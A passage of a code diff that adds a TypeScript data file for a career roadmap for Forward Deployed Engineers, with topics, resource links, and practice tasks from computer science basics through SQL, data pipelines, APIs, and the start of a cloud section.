@@ -1,0 +1,3599 @@
+import { RoadmapSection, RoadmapTask, RoadmapTaskGuide, RoadmapDefinition } from '../types/roadmap.types';
+
+export const ROADMAP_SECTIONS: RoadmapSection[] = [
+// 0. WHAT IS AN FDE & HOW TO USE THIS ROADMAP
+{
+  id: "start",
+  title: "0. Start Here — What is a Forward Deployed Engineer?",
+  subtitle: "Understand the role, the career path, and the hybrid engineer-consultant mindset",
+  icon: "🗺️",
+  color: "#6366f1",
+  topics: [
+    {id:"what-is-fde",name:"What is a Forward Deployed Engineer (FDE)?",desc:"An FDE is part software engineer, part consultant, part solutions architect. Embedded directly with enterprise clients (Palantir, Anduril, Scale AI, Databricks) to build custom solutions on top of the company's platform.",level:"beginner",subtopics:["Engineering + Consulting Hybrid","Client-Embedded Work","Custom Solution Building","Platform Customization","Cross-Functional Collaboration"],resources:[{label:"Palantir FDE Overview",url:"https://www.palantir.com/careers/"},{label:"What FDEs Do",url:"https://medium.com/@palantir"}]},
+    {id:"fde-vs-swe",name:"FDE vs SWE vs Solutions Engineer vs Sales Engineer",desc:"Understand where the role sits: SWE builds product, FDE deploys & customizes it at client sites, Solutions Engineer focuses on pre-sales architecture, and Sales Engineer handles product demos.",level:"beginner",subtopics:["FDE vs SWE","FDE vs Solutions Engineer","FDE vs Sales Engineer","FDE vs DevRel","Career Progression"],resources:[]},
+    {id:"fde-day-in-life",name:"A Day in the Life of an FDE",desc:"Morning: client standup and requirements triage. Midday: write data transformation pipelines. Afternoon: build client dashboard for the CTO. Evening: write deployment runbooks and sync with core engineering.",level:"beginner",subtopics:["Client Standups","Debugging in Production","Custom Feature Building","Client Presentations","Documentation Writing","Context Switching"],resources:[]},
+    {id:"how-to-use-roadmap",name:"How to Use This Roadmap",desc:"Follow the sequential path. For each section, master the core concepts first, then complete the hands-on practical tasks to build muscle memory. Progress auto-saves in your browser.",level:"beginner",subtopics:["Top-to-Bottom Order","Essential First","Hands-on Practical Tasks","Progress Auto-Saves","Filter by Level"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-start-1",title:"Personal FDE Skill Audit & 6-Month Roadmap Plan",level:"beginner",est:"45m",desc:"Audit your current foundation (e.g. React/Next.js familiarity vs Python/SQL gaps). Set a weekly study schedule of 10-15 hours and establish 3 milestone target dates."},
+    {id:"t-start-2",title:"Analyze 5 Real FDE Job Specs (Palantir, Scale AI, Anduril, Databricks)",level:"beginner",est:"1.5h",desc:"Review 5 current FDE job descriptions. Create a table comparing core programming languages, data engineering requirements, client-facing expectations, and travel demands."},
+    {id:"t-start-3",title:"Draft an FDE Client Value Pitch Memo",level:"intermediate",est:"1h",desc:"Write a 1-page memo answering: 'Why should an enterprise client embed an FDE on-site instead of just hiring external IT contractors or using pure SaaS?'"}
+  ]
+},
+
+// 1. COMPUTER SCIENCE FOUNDATIONS
+{
+  id: "cs-foundations",
+  title: "1. Computer Science Foundations",
+  subtitle: "Core CS knowledge — start here if you're new to programming or self-taught",
+  icon: "🧠",
+  color: "#8b5cf6",
+  topics: [
+    {id:"how-computers-work",name:"How Computers Work & Memory Basics",desc:"CPU, registers, RAM, disk storage, binary, compilation vs interpretation. Understanding why code runs fast or slow starts here.",level:"beginner",subtopics:["CPU & Clock Cycles","RAM vs Storage","Binary & Hex","Compilation vs Interpretation","Bits & Bytes","Operating System Role"],resources:[{label:"Crash Course CS",url:"https://www.youtube.com/watch?v=tpIctyqH29Q&list=PL8dPuuaLjXtNlUrzyH5r6jN9ulIgZBpdo"}]},
+    {id:"prog-thinking",name:"Algorithmic Thinking & Problem Decomposition",desc:"How to decompose complex client problems into step-by-step algorithms. Pseudocode, flowcharts, input-output mapping, and identifying edge cases.",level:"beginner",subtopics:["Problem Decomposition","Pseudocode","Flowcharts","Input → Process → Output","Edge Cases","Debugging Mindset"],resources:[]},
+    {id:"data-structures",name:"Data Structures (Arrays to Graphs)",desc:"Arrays, linked lists, stacks, queues, hash tables, trees, and graphs. Know their memory layout, lookup/insertion trade-offs, and when to apply them.",level:"essential",subtopics:["Arrays","Linked Lists","Stacks & Queues","Hash Maps / Dictionaries","Trees (Binary, BST)","Graphs","Heaps / Priority Queues","Sets"],resources:[{label:"NeetCode",url:"https://neetcode.io"},{label:"Visualgo",url:"https://visualgo.net"}]},
+    {id:"algorithms",name:"Core Algorithms & Problem Solving",desc:"Binary search, quicksort/mergesort, recursion, BFS/DFS traversals, sliding window, two pointers, and dynamic programming.",level:"essential",subtopics:["Binary Search","Merge Sort","Quick Sort","Recursion","BFS & DFS","Greedy Algorithms","Dynamic Programming","Sliding Window","Two Pointers","Backtracking"],resources:[{label:"LeetCode",url:"https://leetcode.com"},{label:"Abdul Bari Algorithms",url:"https://www.youtube.com/c/AbdulBari"}]},
+    {id:"big-o",name:"Big-O Notation & Complexity Analysis",desc:"Measure runtime and memory growth: O(1), O(log n), O(n), O(n log n), O(n²). Essential for system performance and technical interviews.",level:"essential",subtopics:["O(1) Constant","O(log n) Logarithmic","O(n) Linear","O(n log n)","O(n²) Quadratic","Space Complexity","Best/Average/Worst Case"],resources:[]},
+    {id:"oop-concepts",name:"Object-Oriented Programming (OOP) & SOLID",desc:"Classes, encapsulation, inheritance, polymorphism, and the SOLID principles used to structure enterprise codebases.",level:"essential",subtopics:["Classes & Objects","Constructors","Inheritance","Polymorphism","Encapsulation","Abstraction","SOLID Principles","Composition vs Inheritance"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-cs-1",title:"Build 4 Core Data Structures from Scratch",level:"beginner",est:"3h",desc:"Implement a Dynamic Array, Singly Linked List, Stack, and Hash Map with basic collision handling without using high-level collections."},
+    {id:"t-cs-2",title:"Solve 10 LeetCode Easy & Medium Patterns",level:"intermediate",est:"5h",desc:"Complete 2 Two-Pointer, 2 Sliding Window, 2 Binary Search, 2 Tree BFS/DFS, and 2 Hash Map questions. Write out Big-O time and space complexity for each."},
+    {id:"t-cs-3",title:"Refactor a Spaghetti Script into OOP with SOLID",level:"intermediate",est:"2h",desc:"Take a procedural script with nested if/else statements and refactor it into clean classes using Single Responsibility and Dependency Inversion principles."}
+  ]
+},
+
+// 2. COMMAND LINE, SHELL & OS
+{
+  id: "cli-os",
+  title: "2. Command Line, Shell & Operating System",
+  subtitle: "You'll live in the terminal at client sites — master shell navigation, scripting & Linux",
+  icon: "💻",
+  color: "#22c55e",
+  topics: [
+    {id:"terminal-basics",name:"Terminal Navigation & File Operations",desc:"Navigating directories (cd, ls, pwd), manipulating files (cp, mv, rm, mkdir, touch), viewing contents (cat, less, head, tail), and keyboard shortcuts.",level:"beginner",subtopics:["cd / ls / pwd","mkdir / rm / cp / mv","cat / less / head / tail","touch / echo","clear / history","Tab Completion"],resources:[{label:"Linux Journey",url:"https://linuxjourney.com"}]},
+    {id:"shell-scripting",name:"Shell Scripting (Bash/Zsh) & Text Processing",desc:"Variables, conditionals, loops, functions, I/O redirection (> >>), pipes (|), and text parsing powerhouses: grep, sed, and awk.",level:"essential",subtopics:["Variables","if/else","for/while Loops","Functions","Pipes & Redirection","grep / sed / awk","chmod & Permissions","cron Jobs"],resources:[]},
+    {id:"ssh-remote",name:"SSH, Remote Access & Session Management",desc:"SSH key pairs, remote terminal access, SCP/SFTP file transfers, SSH tunneling, jump hosts, and multiplexers (tmux).",level:"essential",subtopics:["SSH Keys (ssh-keygen)","SSH Config","SCP / SFTP","SSH Tunneling","Jump/Bastion Hosts","tmux / screen"],resources:[]},
+    {id:"linux-fundamentals",name:"Linux OS Fundamentals & Process Management",desc:"File system hierarchy, users/groups, file permissions (chmod, chown), process monitoring (ps, top, htop, kill), systemd services, and journalctl.",level:"essential",subtopics:["File System Hierarchy","Users & Permissions","Processes (ps, top, kill)","Disk Usage (df, du)","systemd / systemctl","Logs (/var/log)","File Permissions (chmod, chown)"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-cli-1",title:"Terminal Mastery: Setup & Directory Tree Manipulation",level:"beginner",est:"1h",desc:"Create a nested project structure using CLI only, set custom aliases in your .zshrc/.bashrc, search files with `find`, and inspect permissions."},
+    {id:"t-cli-2",title:"Build an Automated Log Analysis Shell Script",level:"intermediate",est:"2h",desc:"Write a bash script using `awk`, `grep`, `sort`, and `uniq -c` that parses an access log file, computes the top 5 IP addresses, and flags all 5xx HTTP errors."},
+    {id:"t-cli-3",title:"Configure Passwordless SSH & Tmux Remote Workflow",level:"intermediate",est:"1.5h",desc:"Generate Ed25519 SSH keys, configure `~/.ssh/config` with host aliases, connect to a remote VM/container, and set up a persistent multi-pane tmux workspace."}
+  ]
+},
+
+// 3. GIT & VERSION CONTROL
+{
+  id: "git",
+  title: "3. Git & Version Control",
+  subtitle: "Every line of client and product code is version-controlled — master clean git workflows",
+  icon: "🔀",
+  color: "#f43f5e",
+  topics: [
+    {id:"git-basics",name:"Git Fundamentals (init, commit, push, pull)",desc:"Working directory, staging area, local repository, commits with clear messages, branching, pushing, and pulling from remote repos.",level:"beginner",subtopics:["git init","git add / stage","git commit","git push / pull","git clone",".gitignore","git status / log"],resources:[{label:"Git Handbook",url:"https://guides.github.com/introduction/git-handbook/"},{label:"Learn Git Branching",url:"https://learngitbranching.js.org"}]},
+    {id:"git-branching",name:"Branching Strategies & Conflict Resolution",desc:"Feature branching, merging, identifying 3-way merge conflicts, reading conflict markers, and resolving them cleanly.",level:"essential",subtopics:["git branch","git checkout / switch","git merge","Merge Conflicts","Feature Branches","Branch Naming Conventions"],resources:[]},
+    {id:"git-advanced",name:"Advanced Git (Rebase, Cherry-pick, Bisect, Reflog)",desc:"Interactive rebase (squash, reword, fixup), cherry-picking commits, binary searching bugs with `git bisect`, and recovering lost commits with `git reflog`.",level:"recommended",subtopics:["Interactive Rebase","Cherry-pick","git bisect","git reflog","git stash","Submodules","Worktrees","Squash Commits"],resources:[]},
+    {id:"git-collab",name:"GitHub PR Workflows & Conventional Commits",desc:"Pull requests, thorough code reviews, branch protection rules, semantic commit messages (feat:, fix:, docs:), and automated changelogs.",level:"essential",subtopics:["Pull Requests","Code Review Process","Issues & Projects","GitHub Actions","Branch Protection","CODEOWNERS","Draft PRs"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-git-1",title:"Create a Repo with Semantic Commits & Pre-Commit Hooks",level:"beginner",est:"1h",desc:"Initialize a Git repo, configure a .gitignore, install pre-commit linter hooks, and commit 5 features using Conventional Commits syntax."},
+    {id:"t-git-2",title:"Simulate & Resolve a Multi-File Merge Conflict",level:"intermediate",est:"1h",desc:"Create two divergent branches modifying overlapping functions, merge them to trigger a merge conflict, resolve via CLI, and verify tests pass."},
+    {id:"t-git-3",title:"Interactive Rebase & Git Bisect Debugging Challenge",level:"intermediate",est:"2h",desc:"Use `git rebase -i` to squash 4 messy commits into 1 atomic commit. Introduce a regression, and write a script to locate it using `git bisect run`."}
+  ]
+},
+
+// 4. PYTHON (Primary FDE Language)
+{
+  id: "python",
+  title: "4. Python (Primary FDE Language)",
+  subtitle: "The lingua franca at Palantir, Scale AI, and Databricks — from scripting to data pipelines",
+  icon: "🐍",
+  color: "#3776ab",
+  topics: [
+    {id:"py-setup",name:"Python Setup, Virtual Environments & Tooling",desc:"Python 3 installation, virtual environments (venv), package management with pip, pyenv, requirements.txt, and VS Code/PyCharm setup.",level:"beginner",subtopics:["Install Python 3","pip install","venv / virtualenv","pyenv","requirements.txt","VS Code Python Extension"],resources:[{label:"Python.org",url:"https://www.python.org/downloads/"},{label:"Real Python Setup",url:"https://realpython.com/installing-python/"}]},
+    {id:"py-syntax",name:"Python Syntax, Data Types & Control Flow",desc:"Variables, strings, lists, dicts, tuples, sets, list comprehensions, conditional statements, and loops.",level:"beginner",subtopics:["Variables","Data Types","print() / input()","Comments","Indentation","Type Casting","f-strings","List Comprehensions"],resources:[{label:"Python Tutorial",url:"https://docs.python.org/3/tutorial/"},{label:"Automate Boring Stuff",url:"https://automatetheboringstuff.com/"}]},
+    {id:"py-functions-oop",name:"Functions, Modules & Object-Oriented Python",desc:"Functions (*args, **kwargs), decorators, classes, magic methods (__init__, __str__, __repr__), dataclasses, and inheritance.",level:"essential",subtopics:["def / return","*args / **kwargs","Lambda Functions","Classes & Objects","Dataclasses","Decorators","Magic Methods"],resources:[]},
+    {id:"py-error-io",name:"File I/O, Error Handling & Logging",desc:"Reading and writing CSV/JSON/TXT files using context managers (with), try/except/finally blocks, and the standard logging module.",level:"essential",subtopics:["open() / with Statement","CSV & JSON Modules","try / except / finally","Custom Exceptions","logging Module","pathlib"],resources:[]},
+    {id:"py-pandas",name:"Pandas DataFrames for Data Manipulation",desc:"DataFrames, Series, reading CSV/Excel, filtering, grouping, aggregating, merging/joining, reshaping, and handling missing data.",level:"essential",subtopics:["DataFrames","Series","read_csv / read_excel","Filtering & Indexing","GroupBy","Merge & Join","Pivot Tables","apply() / map()","Missing Data Handling"],resources:[{label:"Pandas Docs",url:"https://pandas.pydata.org/docs/"},{label:"Kaggle Pandas Course",url:"https://www.kaggle.com/learn/pandas"}]},
+    {id:"py-scripting-cli",name:"CLI Automation, Subprocess & Requests",desc:"Building CLI tools with argparse/click, running system commands via subprocess, making HTTP requests with requests/httpx.",level:"essential",subtopics:["os / shutil","subprocess","argparse / click","pathlib","requests Library","Environment Variables (python-dotenv)"],resources:[]},
+    {id:"py-testing",name:"Testing with Pytest & TDD Basics",desc:"Unit tests, fixtures, mocking external APIs (unittest.mock), parameterized tests, and test coverage reporting.",level:"essential",subtopics:["pytest Basics","Assertions","Fixtures","Mocking (unittest.mock)","Parametrize","Coverage","conftest.py"],resources:[]},
+    {id:"py-web",name:"FastAPI & Web Services",desc:"Building performant REST APIs with FastAPI, Pydantic data validation schemas, dependency injection, and automatic Swagger docs.",level:"recommended",subtopics:["FastAPI","Pydantic Models","Routing","Request / Response","Dependency Injection","Middleware","Swagger Docs"],resources:[{label:"FastAPI Docs",url:"https://fastapi.tiangolo.com/"}]}
+  ],
+  tasks: [
+    {id:"t-py-1",title:"Build a CLI Data Cleaning Tool with Argparse",level:"beginner",est:"2h",desc:"Build a Python command-line utility that takes a messy CSV input, cleans null values, reformats date strings to ISO-8601, and writes out clean JSON."},
+    {id:"t-py-2",title:"Resilient API Ingestion Script with Logging & Retries",level:"intermediate",est:"3h",desc:"Write an automated script that calls an external REST API with exponential backoff retries, validates payloads with Pydantic, and logs execution to a rotating JSON log file."},
+    {id:"t-py-3",title:"Pandas Analytics Pipeline on a Real Dataset",level:"intermediate",est:"3h",desc:"Download a 100k+ row public dataset. Perform group-by aggregations, compute rolling averages, impute missing values, and output summary KPIs."},
+    {id:"t-py-4",title:"Production-Grade FastAPI Microservice with Pytest Suite",level:"intermediate",est:"4h",desc:"Develop a FastAPI service with 4 endpoints (CRUD operations), in-memory SQLite backend, Pydantic validation, and a comprehensive pytest suite with 90%+ coverage."}
+  ]
+},
+
+// 5. JAVASCRIPT & TYPESCRIPT
+{
+  id: "js-ts",
+  title: "5. JavaScript & TypeScript",
+  subtitle: "Frontend foundation & typed systems — essential for client dashboards, tooling & Node.js",
+  icon: "⚡",
+  color: "#eab308",
+  topics: [
+    {id:"js-basics",name:"JavaScript Core & DOM Manipulation",desc:"Variables (let/const), data types, functions, arrays/objects, DOM selection, event listeners, and bubbling.",level:"beginner",subtopics:["let / const","Data Types","Functions","DOM Events","Event Delegation","querySelector","createElement"],resources:[{label:"javascript.info",url:"https://javascript.info"},{label:"MDN JS",url:"https://developer.mozilla.org/en-US/docs/Web/JavaScript"}]},
+    {id:"js-es6",name:"Modern ES6+ Features",desc:"Arrow functions, destructuring, rest/spread operators, template literals, ES modules, optional chaining (?.), nullish coalescing (??).",level:"essential",subtopics:["Arrow Functions","Destructuring","Spread / Rest","Modules (import/export)","Optional Chaining","Nullish Coalescing","Map / Set"],resources:[]},
+    {id:"js-async",name:"Asynchronous JS: Promises, Async/Await & Event Loop",desc:"Event loop, call stack, microtask queue, Promises, async/await, fetch API, and handling concurrent requests.",level:"essential",subtopics:["Callbacks","Promises","async / await","Event Loop","Microtask Queue","fetch() API","Promise.all / allSettled"],resources:[]},
+    {id:"ts-basics",name:"TypeScript Fundamentals & Interfaces",desc:"Static typing, type annotations, interfaces, type aliases, unions, enums, type narrowing, and strict mode.",level:"essential",subtopics:["Type Annotations","Interfaces","Union Types","Type Aliases","Type Inference","any / unknown / never","Type Narrowing"],resources:[{label:"TypeScript Handbook",url:"https://www.typescriptlang.org/docs/handbook/"}]},
+    {id:"ts-advanced",name:"TypeScript Generics & Utility Types",desc:"Generic functions and classes, Partial, Pick, Omit, Record, mapped types, conditional types, and zod schema validation.",level:"recommended",subtopics:["Generics","Partial / Pick / Omit / Record","Mapped Types","Discriminated Unions","Type Guards","Zod Validation"],resources:[]},
+    {id:"nodejs",name:"Node.js Runtime & Package Ecosystem",desc:"Node.js architecture, npm/pnpm package management, file system (fs/promises), environment variables, and Express/Fastify basics.",level:"essential",subtopics:["Node.js Architecture","npm / pnpm","fs Module","Streams","Environment Variables","Express.js Basics"],resources:[{label:"Node.js Docs",url:"https://nodejs.org/docs/latest/api/"}]}
+  ],
+  tasks: [
+    {id:"t-js-1",title:"Vanilla JS Interactive Data Table with Sorting & Filter",level:"beginner",est:"2h",desc:"Build an interactive data table using vanilla JS and HTML/CSS: column sorting, live substring search, pagination, and localStorage persistence."},
+    {id:"t-js-2",title:"Async Request Concurrency Limiter in TypeScript",level:"intermediate",est:"2.5h",desc:"Write a typed TypeScript utility function that takes an array of 50 tasks and executes them with a strict concurrency limit of 5, retry with backoff, and typed results."},
+    {id:"t-js-3",title:"End-to-End Enterprise Schema Validation with Zod & TypeScript",level:"intermediate",est:"2h",desc:"Define complex multi-tenant data schemas using TypeScript interfaces and Zod schemas, write unit tests validating valid and corrupted payloads."}
+  ]
+},
+
+// 6. REACT & NEXT.JS
+{
+  id: "react-next",
+  title: "6. React & Next.js",
+  subtitle: "Build customer-facing dashboards, internal admin consoles, and embedded data apps",
+  icon: "⚛️",
+  color: "#61dafb",
+  topics: [
+    {id:"react-basics",name:"React Core (Components, JSX, Props, State)",desc:"Functional components, JSX syntax, props drilling vs composition, useState, conditional rendering, lists and keys.",level:"essential",subtopics:["Functional Components","JSX","Props","useState","Conditional Rendering","Lists & Keys","Event Handling"],resources:[{label:"React Docs",url:"https://react.dev"}]},
+    {id:"react-hooks",name:"React Hooks Deep Dive",desc:"useEffect lifecycle and cleanup, useRef for DOM & persistent values, useMemo and useCallback for optimization, useContext, custom hooks.",level:"essential",subtopics:["useEffect","useRef","useMemo","useCallback","useContext","Custom Hooks","Rules of Hooks"],resources:[]},
+    {id:"react-state",name:"State Management & Server State",desc:"Local state vs global state, Zustand for client state, TanStack Query (React Query) for server caching, mutations, and optimistic updates.",level:"recommended",subtopics:["Zustand","TanStack Query (React Query)","Context API","Optimistic Updates","Cache Invalidation"],resources:[]},
+    {id:"nextjs-basics",name:"Next.js App Router & Architecture",desc:"App directory, server vs client components ('use client'), nested layouts, loading skeletons, error boundaries, dynamic routing.",level:"essential",subtopics:["App Directory","Layouts & Pages","Server vs Client Components","Loading UI","Error Boundaries","Route Handlers"],resources:[{label:"Next.js Docs",url:"https://nextjs.org/docs"}]},
+    {id:"nextjs-rendering",name:"SSR, SSG, ISR & Streaming",desc:"Server-side rendering (SSR), static site generation (SSG), incremental static regeneration (ISR), and React Suspense streaming.",level:"essential",subtopics:["SSR","SSG","ISR","Dynamic Rendering","Suspense Streaming","Partial Prerendering"],resources:[]},
+    {id:"nextjs-data",name:"Next.js Server Actions & Mutations",desc:"Invoking server-side functions directly from client components, form handling with useActionState, revalidation tags, and secure cookies.",level:"recommended",subtopics:["Server Actions","revalidatePath / revalidateTag","Form Validation","Cookies & Auth Tokens"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-react-1",title:"Build a Real-Time Operations Metrics Dashboard in React",level:"beginner",est:"3h",desc:"Create a client telemetry dashboard with 4 metric cards, time-range selectors, custom `useDebounce` hook, and status indicator pills."},
+    {id:"t-react-2",title:"Full-Stack Next.js Client Portal with Server Components",level:"intermediate",est:"4h",desc:"Build a multi-page Next.js portal using App Router: server-side data fetching, streaming with Suspense, error boundaries, and dynamic slug routes."},
+    {id:"t-react-3",title:"Server Actions Client Onboarding Form with Optimistic UI",level:"intermediate",est:"3h",desc:"Implement a multi-step tenant configuration form using Server Actions, Zod validation, optimistic UI updates, and toast alerts."}
+  ]
+},
+
+// 7. SQL & DATABASES
+{
+  id: "databases",
+  title: "7. SQL & Databases",
+  subtitle: "Data is at the center of every FDE deployment — master relational schemas & query optimization",
+  icon: "🗄️",
+  color: "#22c55e",
+  topics: [
+    {id:"db-concepts",name:"Database Fundamentals (Relational vs NoSQL)",desc:"Tables, rows, columns, relational schema design, primary/foreign keys, ACID properties, and choosing SQL vs NoSQL.",level:"beginner",subtopics:["Tables & Schema","Primary & Foreign Keys","ACID Properties","SQL vs NoSQL","Normalized vs Denormalized"],resources:[{label:"SQLBolt",url:"https://sqlbolt.com"},{label:"Khan Academy SQL",url:"https://www.khanacademy.org/computing/computer-science/sql"}]},
+    {id:"sql-basics",name:"Core SQL Queries & Multi-Table Joins",desc:"SELECT, WHERE filtering, ORDER BY, LIMIT, INNER JOIN, LEFT/RIGHT JOIN, FULL OUTER JOIN, aliasing, and NULL handling.",level:"essential",subtopics:["SELECT / WHERE","INNER JOIN","LEFT / RIGHT JOIN","FULL OUTER JOIN","Aliases (AS)","DISTINCT","COALESCE"],resources:[{label:"W3Schools SQL",url:"https://www.w3schools.com/sql/"}]},
+    {id:"sql-intermediate",name:"Aggregations, Grouping & Subqueries",desc:"COUNT, SUM, AVG, MIN, MAX, GROUP BY, HAVING filtering, subqueries, CASE WHEN conditional logic, and UNION / UNION ALL.",level:"essential",subtopics:["GROUP BY","HAVING","Subqueries","CASE WHEN","UNION / UNION ALL","EXISTS / IN"],resources:[]},
+    {id:"sql-advanced",name:"Window Functions, CTEs & EXPLAIN Optimization",desc:"Window functions (ROW_NUMBER, RANK, DENSE_RANK, LAG, LEAD), Common Table Expressions (WITH), recursive CTEs, and EXPLAIN ANALYZE.",level:"recommended",subtopics:["ROW_NUMBER()","RANK() / DENSE_RANK()","LAG() / LEAD()","CTEs (WITH clause)","EXPLAIN ANALYZE","Query Indexes"],resources:[]},
+    {id:"db-design",name:"Database Design & Normalization",desc:"Entity-Relationship (ER) diagrams, 1NF to 3NF normalization, foreign key constraints, indexes (B-tree, Hash), and star schemas.",level:"essential",subtopics:["ER Diagrams","1NF / 2NF / 3NF Normalization","Foreign Keys","Index Strategy","Star Schema"],resources:[]},
+    {id:"postgresql",name:"PostgreSQL Deep Dive & NoSQL (Redis)",desc:"Postgres JSONB data type, full-text search, extensions (pgvector), and Redis for in-memory caching and session stores.",level:"essential",subtopics:["psql CLI","JSON / JSONB","Postgres Extensions","Redis Key-Value","Cache Expiration (TTL)"],resources:[{label:"PostgreSQL Tutorial",url:"https://www.postgresqltutorial.com/"}]}
+  ],
+  tasks: [
+    {id:"t-db-1",title:"Write 15 Complex Business Reporting SQL Queries",level:"beginner",est:"2.5h",desc:"Using a sample e-commerce/SaaS database schema, write queries for user retention cohorts, monthly revenue totals, and highest spending accounts."},
+    {id:"t-db-2",title:"Advanced Financial Analytics with Window Functions & CTEs",level:"intermediate",est:"3h",desc:"Write multi-step CTE queries using `LAG()`, `LEAD()`, and `ROW_NUMBER()` to calculate rolling 7-day revenue, month-over-month growth, and rank top customers."},
+    {id:"t-db-3",title:"Design an Enterprise Audit Database & Optimize with EXPLAIN",level:"intermediate",est:"3h",desc:"Design a 3NF schema for client audit logs in PostgreSQL. Create appropriate composite indexes and use `EXPLAIN ANALYZE` to optimize a slow query plan."}
+  ]
+},
+
+// 8. DATA ENGINEERING & PIPELINES
+{
+  id: "data-eng",
+  title: "8. Data Engineering & Pipelines",
+  subtitle: "ETL, data transformation, batch/stream processing — the heartbeat of client deployments",
+  icon: "🔁",
+  color: "#06b6d4",
+  topics: [
+    {id:"data-thinking",name:"Data Lifecycle & Pipeline Architecture",desc:"Source extraction, ingestion, transformation, storage, serving, and consumption. Understanding how enterprise data flows.",level:"beginner",subtopics:["Source Systems","Ingestion","Transformation","Data Lake vs Warehouse","Data Quality"],resources:[]},
+    {id:"etl-concepts",name:"ETL vs ELT & Batch Processing",desc:"Extract-Transform-Load vs Extract-Load-Transform, batch processing intervals, idempotency, data deduplication, and schema drift.",level:"essential",subtopics:["ETL vs ELT","Batch Processing","Idempotency","Schema Evolution","Data Validation","Incremental Loads"],resources:[]},
+    {id:"data-formats",name:"Data Formats (JSON, CSV, Parquet, Avro)",desc:"Row-oriented (CSV, JSON) vs Columnar (Parquet, ORC). Why Parquet saves 80%+ storage and accelerates analytical queries.",level:"essential",subtopics:["JSON / CSV","Parquet (Columnar)","Avro","Protocol Buffers","Data Compression (Snappy, Gzip)"],resources:[]},
+    {id:"data-pipelines",name:"Workflow Orchestration (Airflow, Prefect, Dagster)",desc:"Directed Acyclic Graphs (DAGs), task scheduling, dependency management, retry policies, backfills, and pipeline alerting.",level:"recommended",subtopics:["Apache Airflow","Prefect","DAGs Concept","Scheduling & Crons","Retries & SLAs","Data Lineage"],resources:[{label:"Airflow Docs",url:"https://airflow.apache.org/docs/"}]},
+    {id:"data-warehousing",name:"Cloud Data Warehouses & dbt",desc:"Snowflake, BigQuery, AWS Redshift, dimension/fact modeling, and dbt (data build tool) for modular SQL transformations.",level:"recommended",subtopics:["Snowflake","Google BigQuery","AWS Redshift","dbt (Data Build Tool)","Fact & Dimension Tables"],resources:[]},
+    {id:"streaming",name:"Event Streaming & Distributed Data (Kafka, Spark)",desc:"Event-driven streaming, Kafka topics/producers/consumers, distributed computing with Apache Spark / PySpark.",level:"advanced",subtopics:["Apache Kafka","Producers & Consumers","Topics & Partitions","PySpark Basics","Distributed DataFrames"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-de-1",title:"Build an Automated Batch ETL Pipeline in Python",level:"beginner",est:"3h",desc:"Create a standalone Python pipeline that extracts raw JSON data, deduplicates records, normalizes schemas, and writes partitioned Parquet files."},
+    {id:"t-de-2",title:"Define a Resilient Data Pipeline DAG in Airflow or Prefect",level:"intermediate",est:"4h",desc:"Write an orchestrator DAG with 4 tasks: API extract, schema validation with Great Expectations, transformation, and database load, with retry notifications."},
+    {id:"t-de-3",title:"End-to-End dbt Transformation Project on Sample Warehouse",level:"intermediate",est:"3h",desc:"Set up a dbt project on DuckDB or BigQuery: create staging models, clean dimensions and facts, write schema tests, and compile documentation."}
+  ]
+},
+
+// 9. APIs & INTEGRATION
+{
+  id: "apis",
+  title: "9. APIs & Integration",
+  subtitle: "Connecting legacy client systems to your company's platform via REST, webhooks & SDKs",
+  icon: "🔌",
+  color: "#f97316",
+  topics: [
+    {id:"api-concepts",name:"API Fundamentals & HTTP Protocols",desc:"What is an API? HTTP methods (GET, POST, PUT, PATCH, DELETE), status codes (2xx, 3xx, 4xx, 5xx), headers, and JSON request/response bodies.",level:"beginner",subtopics:["HTTP Methods","Endpoints & URLs","Request / Response Bodies","Status Codes","Headers & Query Params"],resources:[{label:"REST API Tutorial",url:"https://restfulapi.net/"},{label:"Postman",url:"https://www.postman.com/"}]},
+    {id:"rest-design",name:"RESTful API Design & OpenAPI / Swagger",desc:"Resource naming conventions, CRUD mapping, pagination (cursor vs offset), rate limiting, versioning, and OpenAPI specs.",level:"essential",subtopics:["Resource Naming","Pagination (Cursor vs Offset)","API Versioning","Error Response Formatting","OpenAPI / Swagger"],resources:[]},
+    {id:"auth-apis",name:"API Security (API Keys, OAuth 2.0, JWT)",desc:"Securing API access: API keys, Bearer tokens, JSON Web Tokens (JWT), OAuth 2.0 Authorization Code flow with PKCE, and refresh tokens.",level:"essential",subtopics:["API Keys","JWT Structure","OAuth 2.0 Flows","Client Credentials","Scopes & Permissions","Token Refresh"],resources:[]},
+    {id:"webhooks",name:"Webhooks & Asynchronous Event Notifications",desc:"Event-driven integrations, webhook payload design, HMAC SHA256 signature verification, idempotency keys, and dead letter queues.",level:"essential",subtopics:["Webhook Receivers","HMAC Signature Verification","Retry Logic & Jitter","Idempotency Keys","Dead Letter Queues"],resources:[]},
+    {id:"third-party",name:"Resilient Integration Patterns (Retries, Circuit Breakers)",desc:"Integrating unreliable 3rd-party client APIs: exponential backoff, jitter, circuit breaker pattern, fallback caches, and custom SDK wrappers.",level:"essential",subtopics:["Exponential Backoff","Jitter","Circuit Breaker Pattern","SDK Wrappers","Response Caching","Fallback Strategies"],resources:[]}
+  ],
+  tasks: [
+    {id:"t-api-1",title:"Build an SDK Client Wrapper for a Public API",level:"beginner",est:"2h",desc:"Write a Python or TypeScript SDK client for GitHub or Stripe API: wrap authentication, error parsing, pagination helpers, and write type definitions."},
+    {id:"t-api-2",title:"Build a Production Webhook Receiver with HMAC Verification",level:"intermediate",est:"3h",desc:"Create a webhook endpoint in FastAPI or Next.js that validates incoming cryptographic HMAC signatures, enforces idempotency, and queues processing."},
+    {id:"t-api-3",title:"Implement Circuit Breaker & Exponential Backoff Gateway",level:"intermediate",est:"3h",desc:"Build an integration proxy wrapping a flaky simulated downstream service. Implement timeout thresholds, exponential backoff, and circuit breaker trip states."}
+  ]
+},
+
+// 10. CLOUD & INFRASTRUCTURE
+{
+  id: "cloud",
+  title: "10. Cloud & Infrastructure",
+  subtitle: "Deploy, containerize, and manage services in AWS, GCP, Azure, and client VPCs",
+  icon: "☁️",
+  color: "#f59e0b",
+  topics: [
